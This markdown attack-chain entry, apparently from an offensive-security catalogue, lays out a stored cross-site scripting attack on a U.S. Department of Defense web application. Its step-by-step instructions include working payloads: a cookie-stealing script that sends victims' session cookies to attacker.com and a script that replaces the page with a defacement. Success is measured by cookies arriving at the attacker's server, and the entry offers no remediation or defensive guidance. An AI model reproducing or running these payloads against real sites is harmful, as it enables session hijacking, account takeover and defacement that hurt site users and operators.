---
id: ac-stored-xss-dod-app
tags:
  - xss
  - stored-xss
  - web-vulnerability
  - session-hijacking
  - defacement
type: attack_chain
tools: []
tactics:
  - '[[Execution]]'
  - '[[Collection]]'
verified: false
platforms:
  - Web
submitted: true
complexity: medium
created_at: '2023-10-01T00:00:00Z'
procedures:
  - '[[procedures/Inject-and-Exploit-Stored-XSS]]'
step_count: 1
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-14T03:16:19.911Z'
description: >-
  A stored cross-site scripting attack targeting a U.S. Department of Defense
  web application, enabling persistent script injection for session hijacking,
  arbitrary requests, malware prompts, and defacement.
skill_level: intermediate
impact_level: high
validated: true
mitre_tactics:
  - '[[Execution]]'
  - '[[Collection]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Stored XSS in DoD Application for Session Hijacking and Defacement

Multi-stage attack chain demonstrating a complete attack workflow exploiting a stored XSS vulnerability in a U.S. Department of Defense web application.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 1 |
| Execution Time | ~5 minutes |
| Skill Level | Intermediate |
| Complexity | Medium |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Identify Vulnerability] --> B[Inject Malicious Script]
    B --> C[Execute Payload on Victims]
    C --> D[Hijack Sessions and Deface]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#3498db
    style D fill:#27ae60
```

## Prerequisites & Requirements

### Required Tools

- Browser developer tools for script injection
- JavaScript payload generator (e.g., manual crafting)

### Target Environment

- Web platform
- Vulnerable DoD application at https://███
- User input fields that store and reflect content without sanitization

### Initial Access Requirements

- Access to the application (authenticated or public)
- Ability to submit input via forms or parameters
- No prior credentials needed beyond basic user access

## Detailed Attack Procedures

### Step 1: Identify and Exploit Stored XSS
procedure: [[procedures/Inject-and-Exploit-Stored-XSS]]

**Objective**: Discover the stored XSS vulnerability, inject a malicious JavaScript payload, and achieve persistence for victim execution leading to session hijacking and defacement.

**Instructions**: Begin by testing input fields in the DoD application for lack of sanitization. Use browser developer tools to craft and submit a payload like `<script>alert('XSS')</script>` in a form field that stores data (e.g., comments or profiles). Verify persistence by accessing the page as another user or refreshing. Escalate by replacing the alert with a payload to steal cookies: `<script>document.location='http://attacker.com/steal?cookie='+document.cookie;</script>`. For defacement, inject `<script>document.body.innerHTML='<h1>Hacked!</h1>';</script>`. Monitor attacker server for exfiltrated data.

**Expected Output**: Script executes in victim's browser, alerting or redirecting; cookies sent to attacker; page defaced on load.

**Success Indicators**:
- Payload executes without errors in console
- Cookies or requests received on attacker endpoint
- Visual defacement observed on affected pages

## Attack Chain Summary

### Key Achievements

1. Persistent script injection bypassing input validation
2. Session hijacking via cookie theft enabling unauthorized access
3. Site defacement and potential malware distribution

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[JavaScript]]

### MITRE ATT&CK Tactics

- [[Execution]]
- [[Collection]]

---
*Last updated: 2023-10-01T00:00:00Z*
